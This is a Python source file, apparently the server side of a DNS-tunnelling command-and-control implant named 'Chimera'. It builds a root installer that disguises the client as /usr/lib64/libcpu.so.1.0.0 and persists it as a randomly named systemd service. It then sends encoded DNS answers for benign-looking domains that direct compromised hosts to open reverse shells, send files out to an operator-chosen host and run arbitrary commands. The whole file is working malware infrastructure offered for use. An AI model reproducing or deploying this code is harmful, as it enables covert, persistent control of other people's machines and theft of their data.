import socket
import struct
import sys
import random
import time
import os
import base64

def createInstaller(host):
    if(os.path.exists('./client.py') and os.path.exists('./shellClient.py')):
        print("Creating installer located at ./installer.py...")
        f = open('./client.py', 'r')
        clientConts = f.read()
        f.close()
        f = open('./installer.py', 'w')
        
        contents = """
#!/usr/bin/env python3
import os
import random
CLIENTCONTS = """ + '"' + clientConts.encode().hex() + '"' + """

SERVICE_NAME = """ + '"' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)) + '"' + """

f = open('/etc/systemd/system/' + SERVICE_NAME + '.service', 'w')
serviceConts = \"""
[Unit]
Description=Stuff 'n things.

[Service]
Type=simple
Restart=on-failure
Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
ExecStart=/usr/lib64/libcpu.so.1.0.0 """ + host + """
StartLimitInterval=1s
StartLimitBurst=999

[Install]
WantedBy=multi-user.target
\"""
f.write(serviceConts)
f.close()
os.system("systemctl daemon-reload")

CLIENTCONTS = bytes.fromhex(CLIENTCONTS).decode()
f = open('/usr/lib64/libcpu.so.1.0.0', 'w')
f.write(CLIENTCONTS)
f.close()

os.system("chmod +x /usr/lib64/libcpu.so.1.0.0")
os.system("systemctl enable " + SERVICE_NAME)
os.system("systemctl start " + SERVICE_NAME)

"""
        f.write(contents)
        f.close()
        print("Installer creation complete. Open the installer file to view the service name as it is a length-6 string of random letters")

if (len(sys.argv) != 2) and (len(sys.argv) != 3):
    print("""
Usage: server.py {ip to listen on}
OR: server.py -s {ip of server}     |     This will create an install file for the current client.py and shellClient.py files. Simply transfer the install file to the remote machine and run it (as root) and it'll install Chimera
""")
    exit()
elif (sys.argv[1] == "-s"):
    createInstaller(sys.argv[2])
    exit()
else:
    LISTEN_IP = sys.argv[1]

def parse_qname(data, offset):
    qname = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        qname.append(data[offset + 1: offset + 1 + length].decode())
        offset += 1 + length
    return ".".join(qname), offset

def _encode_txt_rdata(txt: str, encoding="ascii") -> bytes:
    """
    Encode a logical TXT value into DNS TXT RDATA (one or more <character-string>s).
    Each <character-string> is: [len (1 byte)] + [data bytes], max 255 bytes of data.
    """
    b = txt.encode(encoding)
    out = b""
    for i in range(0, len(b), 255):
        chunk = b[i:i+255]
        out += bytes([len(chunk)]) + chunk
    return out

def to_base64(s: str) -> str:
    return base64.b64encode(s.encode("ascii")).decode("ascii")

def build_response(query, response_data, recordType='A'): #TXT Records must be capped at 400 base64 chars to fit in a single DNS response, so if caller wants to send more than that they should split it up and pass a list of strings that are each <= 400 chars; the server will join them together before encoding. A record responses should be passed as a list of IP strings, even if just one IP is being sent.
    txid = query[0:2]
    flags = b'\x81\x80'  # Standard response (QR=1, RD copied by client typically; RA=1 here)
    qdcount = query[4:6]
    nscount = arcount = b'\x00\x00'

    qname, q_end = parse_qname(query, 12)
    question = query[12:q_end + 4]

    answers = b''

    if recordType.upper() == 'TXT':
        # response_data should be ONE logical TXT string (e.g., 400 base64 chars)
        if isinstance(response_data, (list, tuple)):
            # if caller passed ["..."], take first; or join if they passed pieces
            txt_value = "".join(response_data)
        else:
            txt_value = str(response_data)

        rdata = _encode_txt_rdata(txt_value, encoding="ascii")  # base64 is ASCII-safe

        # One TXT RR in the answer section
        ancount = struct.pack('!H', 1)

        answers += (
            b'\xc0\x0c' +                  # NAME (pointer to qname at offset 12)
            struct.pack('!H', 16) +        # TYPE: TXT
            struct.pack('!H', 1) +         # CLASS: IN
            struct.pack('!I', 60) +        # TTL
            struct.pack('!H', len(rdata)) +# RDLENGTH
            rdata
        )

    else:
        # A records: response_data is a list of IP strings
        if not isinstance(response_data, (list, tuple)):
            response_data = [response_data]

        ancount = struct.pack('!H', len(response_data))

        for ip in response_data:
            answers += (
                b'\xc0\x0c' +               # NAME
                struct.pack('!H', 1) +      # TYPE: A
                struct.pack('!H', 1) +      # CLASS: IN
                struct.pack('!I', 60) +     # TTL
                struct.pack('!H', 4) +      # RDLENGTH
                socket.inet_aton(ip)        # RDATA
            )

    header = txid + flags + qdcount + ancount + nscount + arcount
    return header + question + answers

def handleResponse(sock, query, addr, response_data, recordType='A'):
    response = build_response(query, response_data, recordType)
    sock.sendto(response, addr)

def sendResponseA(sock, data, addr, command, recordType='A'):
    handleResponse(sock, data, addr, ["" + str(random.randint(1,254)) + "." + str(random.randint(1,254)) + "." + str(random.randint(1,254)) + "." + str(command)], recordType)

def sendResponseB(sock, data, addr, destIP, destPort, recordType='A'):
    if(int(destPort) < 256):
        value1 = str(destPort)
        value2 = "0"
    else:
        value1 = "255"
        value2 = str(int(destPort) - 255)
    handleResponse(sock, data, addr, [destIP, value1 + "." + value2 + "." + str(random.randint(1,254)) + ".3"], recordType)
    
def sendResponseC(sock, data, addr, fileName, recordType='A'):
    addressListSplit = []
    for char in fileName:
        addressListSplit.append(ord(char))
    addressListSplit.append(3)
    
    x = 0
    y = 0
    currentAddr = ""
    addressList = []
    
    while (x < len(addressListSplit)):
        if (y == 4):
            y = 0
            addressList.append(currentAddr)
            currentAddr = ""
        currentAddr += (str(addressListSplit[x]) + ".")
            
        y = y + 1
        x = x + 1
    addressList.append(currentAddr)
    while (len((addressList[len(addressList) - 1]).split('.')) < 5):
        addressList[len(addressList) - 1] += (str(random.randint(1,254)) + ".")
        
    x = 0
    while (x < len(addressList)):
        addressList[x] = addressList[x][:-1]
        x = x + 1

    handleResponse(sock, data, addr, addressList, recordType)

def sendResponseD(sock, data, addr, command, recordType='A'):
    handleResponse(sock, data, addr, ["" + str(random.randint(1,254)) + "." + str(command) + "." + str(random.randint(1,254)) + "." + str(random.randint(1,254))], recordType)

def sendResponseE(sock, data, addr, command):
    if len(command) > 300: #400 base64 chars is the max that can fit in a single TXT record, but leaving some buffer for the length bytes; if command is too long to fit in a single response, just send an error message instead of trying to split it up and reassemble on client
        print("Error: command too long for single TXT record response; split into <=300 char pieces and call sendResponseD multiple times with each piece")
        sendResponseA(sock, data, addr, 100)
        return
    handleResponse(sock, data, addr, to_base64(command), 'TXT')

def run(bind_ip=LISTEN_IP, port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((bind_ip, port))
    print(f"[+] Chimera server listening on {bind_ip}:{port}")

    while True:
        data, addr = sock.recvfrom(512)
        domain, _ = parse_qname(data, 12)
        domain = domain.lower().strip('.')

        print(f"[>] Message from {addr[0]}:{addr[1]} for {domain}")
        
        if not (os.path.exists("/tmp/chimera/")):
            os.system("mkdir /tmp/chimera/")
        
        filePath = "/tmp/chimera/" + addr[0]
        if not (os.path.exists(filePath)):
            print("New beacon identified from " + addr[0] + ".")
            open(filePath, "w").close()
            
        f = open(filePath, "r")
        currentConts = f.read()
        f.close()
        contSplit = currentConts.split('\n')
        del(contSplit[0])
        
        if (domain == "supportcenter.net"): #Check-in
            sendResponseA(sock, data, addr, 100)
        elif (domain == "freegames.net"): #Heartbeat
            if(len(contSplit) >= 1):
                command = contSplit[0]
                del(contSplit[0])
                if (command == "shell"):
                    sendResponseA(sock, data, addr, 232)
                elif (command == "file"):
                    sendResponseA(sock, data, addr, 85)
                elif (command == "service"):
                    sendResponseA(sock, data, addr, 150)
                elif (command == "command"):
                    sendResponseD(sock, data, addr, 65)
            else:
                sendResponseA(sock, data, addr, 100)
        elif (domain == "securelogin.com"): #Reverse Shell
            if(len(contSplit) >= 1):
                address = contSplit[0]
                del(contSplit[0])
                addressSplit = address.split(':')
                host = addressSplit[0]
                port = addressSplit[1]
            else:
                host = "100.100.100.100"
                port = 100
            sendResponseB(sock, data, addr, host, port)
        elif (domain == "cloudlogin.com"): #Send file conts
            if(len(contSplit) > 1):
                address = contSplit[0]
                del(contSplit[0])
                addressSplit = address.split(':')
                host = addressSplit[0]
                port = addressSplit[1]
            else:
                host = "100.100.100.100"
                port = 100
            sendResponseB(sock, data, addr, host, port)
        elif (domain == "fileshare.org"): #Get filename
            if(len(contSplit) >= 1):
                fileName = contSplit[0]
                del(contSplit[0])
                sendResponseC(sock, data, addr, fileName)
            else:
                sendResponseA(sock, data, addr, 100)
        elif (domain == "cloudvault.org"): #Get servicename
            if(len(contSplit) >= 1):
                serviceName = contSplit[0]
                del(contSplit[0])
                sendResponseC(sock, data, addr, serviceName)
            else:
                sendResponseA(sock, data, addr, 100)
        elif (domain == "remotehelp.com"): #Send remote command
            if(len(contSplit) >= 1):
                command = contSplit[0]
                del(contSplit[0])
                sendResponseE(sock, data, addr, command)
            
        newContSplit = ['Last heard from: ' + (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))] + contSplit
        newCont = '\n'.join(newContSplit)
        f = open(filePath, "w")
        f.write(newCont)
        f.close()

run()

